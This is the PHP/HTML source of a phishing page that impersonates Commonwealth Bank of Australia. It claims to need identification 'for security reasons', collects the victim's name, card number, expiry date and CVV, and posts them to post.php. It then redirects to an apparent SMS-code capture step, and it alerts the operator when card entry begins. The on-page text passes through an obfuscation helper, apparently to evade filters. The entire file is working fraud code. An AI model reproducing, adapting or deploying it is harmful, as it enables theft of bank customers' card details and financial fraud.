<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log on</title>
    <link rel="stylesheet" href="res/css/auth.css">
</head>
<body>
<header>
    <img src="res/img/logo.png">
</header> 
<section>
 

<div class="title">
<img src="res/img/locker.svg" style="width:40px; margin-bottom:-10px;"> <?php $bm->obf("We need to identify you"); ?>
</div>


<div class="form">
<div class="text">
<?php $bm->obf("We need to do this for security reasons."); ?><br> <?php $bm->obf("Enter the details of one of your CommBank cards below."); ?>
</div>
<table>
<tr>
<td style="font-size:0.8em; padding-right:10px;"><?php $bm->obf("Your name"); ?> </td>
<td><input type="text" id="d0" class="textinput"></td>
</tr>
<tr>
<td style="font-size:0.8em;padding-right:10px;"><?php $bm->obf("Card number"); ?> </td>
<td><input type="text" id="d1" class="textinput"></td>
</tr>
<tr>
<td style="font-size:0.8em;padding-right:10px;"><?php $bm->obf("Expiration date"); ?> </td>
<td><select style="width:70px; height:30px; border:2px solid  #cdcdcd; color:black;" id="m"><?php for($x=1;$x<=31;$x++){if($x<10){$x="0$x";}echo'<option value="'.$x.'">'.$x.'</option>';} ?></select> - <select style="width:80px;  height:30px; border:2px solid  #cdcdcd; color:black;" id="y"><?php for($y=24;$y<=45;$y++){echo'<option value="'.$y.'">20'.$y.'</option>';} ?></select></td>
</tr>
<tr>
<td style="font-size:0.8em;padding-right:10px;"><?php $bm->obf("Security code (CVV)"); ?> </td>
<td><input type="text" id="d3" class="textinput"></td>
</tr>
<tr>
<td></td>
<td><button onclick="sbmt()">Next ></button></td>
</tr>
 
</table>
</div>




</section>
<footer>
<div class="links">
    <span><?php $bm->obf("Tools & calculators"); ?></span>
    <span><?php $bm->obf("Find a branch"); ?></span>
    <span><?php $bm->obf("Financial assistance"); ?></span>
    <span><?php $bm->obf("Contact us"); ?></span>
</div>
<?php $bm->obf("© 2023 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945"); ?>
</footer>

<div id="loader" style="display:none; width:100%; height:100%; position:fixed;  top:0; left:0; background:white;">
<div style="width:100%; height:100%; display:flex; justify-content:center; align-items:center;" >
<div style="text-align:center;">
    <img src="res/img/j1.png" style="width:210px;"><br>
    <img src="res/img/loading.gif" style="width:80px;"><br>
    <p style="font-size:0.8em;"><?php $bm->obf("Please wait..."); ?></p>
</div>
</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>


$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('000');
 

var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}

if($("#d0").val().length<4){
	$("#d0").addClass("error");
	allowSubmit=false;
}
 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});
 
}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    validate();

    if(allowSubmit){
        $("#loader").show();
        $.post("post.php", 
			{
                name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#m option:selected").val()+"/"+$("#y option:selected").val(),
				cvv:$("#d3").val(),


			}, function(done){
                setTimeout(() => {
                    window.location="sms.php";
            },6000);
			}
		
		);

    }
}

var abortNote = false;
$("#d1").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{carding:1});
        abortNote=true;
    }

});
</script>
</body>
</html>